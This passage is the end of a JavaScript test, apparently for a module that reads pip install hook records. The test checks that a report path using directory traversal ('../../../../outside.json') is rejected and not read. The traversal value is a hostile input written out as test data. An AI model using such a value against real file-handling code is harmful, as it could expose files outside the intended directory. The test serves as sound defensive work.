    fs.writeFileSync(path.join(root, "outside.json"), JSON.stringify({ install: [{ metadata: { name: "leaked", version: "1" } }] }));
    fs.writeFileSync(path.join(pip, "hook"), `kind=pip\nt0=${Date.now() - 60_000}\nexit=0\nreport=../../../../outside.json\n`);
    const read = await il.readRawCall(pip);
    assert.ok(read);
    assert.equal(read.hooks[0].report, null);
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
